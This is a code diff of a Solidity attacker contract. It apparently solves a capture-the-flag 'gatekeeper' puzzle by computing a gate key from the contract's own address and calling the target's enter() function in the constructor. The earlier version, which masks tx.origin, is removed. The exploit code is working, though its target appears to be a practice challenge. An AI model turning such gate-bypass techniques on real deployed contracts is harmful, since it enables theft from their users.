@@ -4,33 +4,12 @@ interface Gate{
     function enter(bytes8 _gateKey) external returns (bool);
 }
 
-contract GateAttacker{
-
-    Gate impl; 
-    uint64 offset = 0xFFFFFFFF0000FFFF;
-    bytes8 changedValue;
+contract Gate2Attacker{
 
     constructor(address addr) public {
-        impl = Gate(addr);
-    }
-
-    function getAddress() public {
-        changedValue = bytes8(uint64(tx.origin) & offset);
-    }
-
-    function c1() public view returns (bool){
-        return uint32(uint64(changedValue))!=uint64(changedValue);
-    }
-
-    function c2() public view returns (bool){
-        return uint32(uint64(changedValue))!=uint64(changedValue);
-    }
-
-    function c3() public view returns (bool) {
-        return uint32(uint64(changedValue)) == uint16(tx.origin);
-    }
-
-    function attack() public {
-        impl.enter(changedValue);
+        Gate impl = Gate(addr);
+        bytes8 input = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));
+        impl.enter(input);
     }
 }
+
